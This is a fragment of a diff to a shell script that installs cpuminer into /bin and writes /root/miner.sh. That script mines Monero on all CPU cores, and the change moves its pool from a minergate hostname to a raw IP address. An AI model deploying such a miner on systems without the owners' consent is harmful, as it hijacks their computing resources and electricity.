@@ -8,7 +8,7 @@ cp /var/tmp/cpuminer-src/cpuminer /bin;
 rm -rf /var/tmp/cpuminer-src;
 
 chmod +x /bin/cpuminer;
-printf "#!/bin/sh\ncpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u im@tung.pro -p x --thread=`eval grep -c ^processor /proc/cpuinfo`" > /root/miner.sh;
+printf "#!/bin/sh\ncpuminer -a cryptonight -o stratum+tcp://176.9.147.178:45700 -u im@tung.pro -p x --thread=`eval grep -c ^processor /proc/cpuinfo`" > /root/miner.sh;
 printf '
 #!/bin/sh
 
